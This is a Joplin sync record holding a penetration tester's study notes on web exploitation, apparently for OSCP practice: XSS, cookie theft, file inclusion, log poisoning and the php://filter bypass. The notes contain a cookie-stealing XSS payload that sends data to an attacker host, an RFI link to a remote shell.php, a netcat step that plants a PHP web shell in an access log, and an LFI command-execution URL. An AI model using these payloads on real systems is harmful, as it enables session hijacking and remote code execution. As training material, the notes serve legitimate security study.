id: 5073ae4ff4254b3baeed6d73ae9caeac
parent_id: 
item_type: 1
item_id: e20026fa26ae45ec989c9424b46c29c0
item_updated_time: 1646016692717
title_diff: "[{\"diffs\":[[1,\"1094d9f035074e3a8ef344a61a88cf5e\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":32}]"
body_diff: "[{\"diffs\":[[1,\"Website Exploit\\\r\\\n\\\r\\\n# XSS\\\r\\\n\\\r\\\n## Reverse Shell\\\r\\\n\\\r\\\n## Using Beef\\\r\\\n\\\r\\\nBeef\\\r\\\n\\\r\\\n\\\\*\\\\*Note: \\\\*\\\\*XSS only works if an authenticated user accesses the webpage\\\r\\\n\\\r\\\n# Steal Cookie Session\\\r\\\n\\\r\\\nCookies have two optional flags of interest to pentesters: Secure and HttpOnly\\\r\\\n\\\r\\\n<ins>**Secure flag**</ins> \\\\-\\\\-\\\\- instructs browser to only send the cookie over encrypted connections. This protects cookie from being sent in cleartext and captured over the network\\\r\\\n\\\r\\\n- Make sure the website is not using HTTPS\\\r\\\n\\\r\\\n<ins>**HttpOnly**</ins> \\\\-\\\\-\\\\- instructs browser to deny JS access to the cookie. If the flag is not set, we can use an XSS payload to steal the cookie.\\\r\\\n\\\r\\\n- If HTTPOnly is set, we can try to use cookie jar overflow\\\r\\\n- ![b7757caf5e1a534ff942c14219c18e0f.png](:/d74f9f4349a046bbb52b0e421c07954d)\\\r\\\n- In Firefox console, the cookie did not overflow and got removed; instead we manually deleted the cookie and allowed the browser to overwrite. We can also manually edit the cookie; however, this will not work unless we programme it to\\\r\\\n- We can do a for-loop, then\\\r\\\n\\\r\\\nFirst, use an XSS script if HttpOnly is not set\\\r\\\n\\\r\\\n> &lt;script&gt;new Image().src=’[http://10.11.0.4/hijacker.php?cookie=’+document.cookie;](http://10.11.0.4/hijacker.php?cookie=%E2%80%99+document.cookie;)&lt;/script&gt;\\\r\\\n\\\r\\\nWhen we have our web server open, we will see the user accessing, and the Session ID generated\\\r\\\n\\\r\\\nUse Cookie-Editor to access the webpage\\\r\\\n\\\r\\\n# File Inclusion Vulnerabilities\\\r\\\n\\\r\\\nCheck values of register\\\\_globals, allow\\\\_url wrappers.\\\r\\\n\\\r\\\n- In [version](https://www.plus2net.com/php_tutorial/php-version.php) PHP 5 and above by default, *register_global* is kept OFF.\\\r\\\n- If allow\\\\_url\\\\_include or allow\\\\_url\\\\_fopen is enabled, proceed to do RFI\\\r\\\n\\\r\\\nIf have access to source code, check for **include** and code that are poorly design e.g.\\\r\\\n\\\r\\\n- $file = $_GET\\\\['page'\\\\];\\\r\\\n\\\r\\\nMake sure to look out for parameters that are linked to files (signs of file inclusion)\\\r\\\n\\\r\\\n![28d96990055803bbc316ed7557f0ea00.png](:/a43d4d1f5d3b4e1a9802a632d5ca66e3)\\\r\\\n\\\r\\\n> 192.168.0.2/DVWA/vulnerabilities/fi/?page=http://192.168.0.5:8000/shell.php #For RFI\\\r\\\n\\\r\\\nSometimes, the LFI is in the Request sent. Example shown is from OSCP machine we did\\\r\\\n\\\r\\\n<img src=\\\":/9c71d821603843889d4313b4d820bcb2\\\" alt=\\\"1e1c6c65502bd520d973599be7b3ac72.png\\\" width=\\\"851\\\" height=\\\"514\\\" class=\\\"jop-noMdConv\\\">\\\r\\\n\\\r\\\nSometimes during a Local File Inclusion, the web server appends ‘.php’ to the included file. For example, including ‘/etc/passwd’ gets rendered as ‘/etc/passwd.php’. This occurs when the include function uses a parameter like *?page* and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (%00) would cause the interpreter to stop reading, which would allow the attacker to include their intended page.\\\r\\\n\\\r\\\n# Log File Poisoning\\\r\\\n\\\r\\\nLogs to look into trying - https://www.thegeekstuff.com/2011/08/linux-var-log-files/\\\r\\\n\\\r\\\nFTP - /var/log/**vsftp.d**\\\r\\\n\\\r\\\nSSH, login info - /var/log/**auth.log**\\\r\\\n\\\r\\\nHTTP - On windows if xampp, C:\\\\\\\\xampp\\\\\\\\apache\\\\\\\\logs\\\\\\\\access.log; On Linux, /var/log/apache2/access.log\\\r\\\n\\\r\\\n> nc 192.168.1.102 80\\\r\\\n> \\\r\\\n> &lt;?php echo 'pre&gt;' . shell\\\\_exec($\\\\_GET\\\\['cmd'\\\\]) . '&lt;/pre&gt;';?>\\\r\\\n> \\\r\\\n> \\\\# To access log\\\r\\\n\\\r\\\nAfter writing to the log file, run the file\\\r\\\n\\\r\\\n> http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id\\\r\\\n\\\r\\\n# Bypassing php-execution\\\r\\\n\\\r\\\nSo if you have an LFI you can easily read `.txt`-files but not `.php` files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.\\\r\\\n\\\r\\\n> http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index \\\r\\\n\\\r\\\nHere you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:\\\r\\\n\\\r\\\n> base64 -d savefile.php\\\r\\\n\\\r\\\nid: 1094d9f035074e3a8ef344a61a88cf5e\\\r\\\nparent_id: 8e7bd5349cf3494986eccd0619b576c9\\\r\\\ncreated_time: 2022-01-25T01:48:20.761Z\\\r\\\nupdated_time: 2022-01-25T16:46:37.710Z\\\r\\\nis_conflict: 0\\\r\\\nlatitude: 0.00000000\\\r\\\nlongitude: 0.00000000\\\r\\\naltitude: 0.0000\\\r\\\nauthor: \\\r\\\nsource_url: \\\r\\\nis_todo: 0\\\r\\\ntodo_due: 0\\\r\\\ntodo_completed: 0\\\r\\\nsource: joplin-desktop\\\r\\\nsource_application: net.cozic.joplin-desktop\\\r\\\napplication_data: \\\r\\\norder: 0\\\r\\\nuser_created_time: 2022-01-25T01:48:20.761Z\\\r\\\nuser_updated_time: 2022-01-25T16:46:37.710Z\\\r\\\nencryption_cipher_text: \\\r\\\nencryption_applied: 0\\\r\\\nmarkup_language: 1\\\r\\\nis_shared: 0\\\r\\\nshare_id: \\\r\\\nconflict_original_id: \\\r\\\nmaster_key_id: \\\r\\\ntype_: 1\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":4577}]"
metadata_diff: {"new":{"id":"e20026fa26ae45ec989c9424b46c29c0","parent_id":"fb73d1d872ce4ee6ab184091f1e4c67b","latitude":"0.00000000","longitude":"0.00000000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":1646016692709,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-02-28T02:54:21.642Z
created_time: 2022-02-28T02:54:21.642Z
type_: 13